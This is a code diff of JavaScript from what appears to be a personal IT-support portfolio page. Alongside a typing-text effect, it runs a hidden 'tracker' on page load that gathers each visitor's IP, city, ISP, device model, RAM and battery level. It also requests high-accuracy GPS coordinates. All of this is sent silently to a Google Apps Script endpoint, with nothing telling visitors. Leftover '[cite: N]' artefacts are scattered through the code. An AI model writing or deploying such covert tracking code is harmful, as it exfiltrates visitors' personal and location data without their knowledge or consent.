@@ -1,65 +1,52 @@
 (async function() {
   const getDeviceModel = () => {
-    const ua = navigator.userAgent; [cite: 1]
+    const ua = navigator.userAgent; // [cite: 1]
     if (/android/i.test(ua)) {
-      const match = ua.match(/Android.*;\s([^;]+)\sBuild/); [cite: 1]
+      const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
       return match ? match[1] : "Android Device";
     }
-    if (/iPhone|iPad|iPod/.test(ua) && !window.MSStream) { [cite: 1]
-      const w = window.screen.width; [cite: 1, 2]
-      const h = window.screen.height; [cite: 2]
-      if (w === 390 && h === 844) return "iPhone 12/13/14 Pro"; [cite: 2]
-      if (w === 430 && h === 932) return "iPhone 14/15 Pro Max"; [cite: 2]
-      return "Apple iOS Device"; [cite: 2]
+    if (/iPhone|iPad|iPod/.test(ua) && !window.MSStream) {
+      const w = window.screen.width, h = window.screen.height; // [cite: 2]
+      if (w === 390 && h === 844) return "iPhone 12/13/14 Pro";
+      if (w === 430 && h === 932) return "iPhone 14/15 Pro Max";
+      return "Apple iOS Device";
     }
-    return navigator.platform || "PC/Laptop"; [cite: 2]
+    return navigator.platform || "Unknown Device";
   };
 
   const startTracker = async () => {
     let payload = {
-      ip: "Hidden/Blocked",
-      city: "-",
-      country: "-",
-      isp: "-",
-      userAgent: navigator.userAgent, [cite: 4]
-      platform: navigator.platform, [cite: 4]
-      ram: navigator.deviceMemory || "N/A", [cite: 4]
-      battery: "N/A",
-      deviceName: getDeviceModel(), [cite: 4]
-      lat: "Ditolak",
-      long: "Ditolak"
+      ip: "Hidden/Blocked", city: "-", country: "-", isp: "-",
+      userAgent: navigator.userAgent, platform: navigator.platform,
+      ram: navigator.deviceMemory || "N/A", battery: "N/A", // [cite: 4]
+      deviceName: getDeviceModel()
     };
 
-    // 1. Ambil Data IP, Kota, Negara, & ISP
+    // 1. Ambil Info Network (IP, Kota, Negara, ISP)
     try {
       const res = await fetch('http://ip-api.com/json/');
       const d = await res.json();
       if (d.status === "success") {
-        payload.ip = d.query;
-        payload.city = d.city;
-        payload.country = d.country;
-        payload.isp = d.isp;
+        payload.ip = d.query; payload.city = d.city;
+        payload.country = d.country; payload.isp = d.isp;
       }
-    } catch (e) { console.log("IP-API Blocked"); } [cite: 7]
+    } catch (e) { console.error("IP info failed"); }
 
-    // 2. Ambil Baterai [cite: 5]
+    // 2. Ambil Info Baterai [cite: 5, 6]
     if (navigator.getBattery) {
-      try {
-        const b = await navigator.getBattery(); [cite: 6]
-        payload.battery = Math.round(b.level * 100); [cite: 6]
+      try { 
+        const b = await navigator.getBattery();
+        payload.battery = Math.round(b.level * 100); 
       } catch (e) {}
     }
 
-    const sendData = (data) => {
-      fetch("https://script.google.com/macros/s/AKfycbytLnRKVv_Axyp1kI479GOaG8FlFm8nk1OtqomUMwGRQ6-qEaBcv-GM-gaYIMhzeuHyiw/exec", { [cite: 8]
-        method: "POST",
-        mode: "no-cors",
-        body: JSON.stringify(data)
+    const send = (data) => {
+      fetch("https://script.google.com/macros/s/AKfycbzvqP9k_J5uBeSzADPiO0vJ4D_XS9W5S352PfnrD0B_NlpWi-Q4kGoABiJkv1zu3fLfQw/exec", { // GANTI DENGAN URL DEPLOYMENT 
+        method: "POST", mode: "no-cors", body: JSON.stringify(data)
       });
     };
 
-    // Kirim data awal (IP & Device) segera
-    sendData(payload);
+    send(payload); // Kirim data dasar segera 
 
     // 3. Minta Lokasi GPS (Update jika diizinkan) [cite: 9]
     if (navigator.geolocation) {
@@ -67,15 +54,13 @@
         payload.lat = pos.coords.latitude;
         payload.long = pos.coords.longitude;
         payload.accuracy = pos.coords.accuracy.toFixed(2) + "m";
-        sendData(payload); // Kirim update data dengan koordinat presisi
+        send(payload); 
       }, null, { enableHighAccuracy: true });
     }
   };
 
-// ---------------------------------------------------------------------------------------------------------------------------
+  window.addEventListener('load', () => { startTracker(); });
 
-  window.addEventListener('load', () => {
-    startTracker();
 
   // --- UI EFFECTS (TYPING) ---
   const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast'];
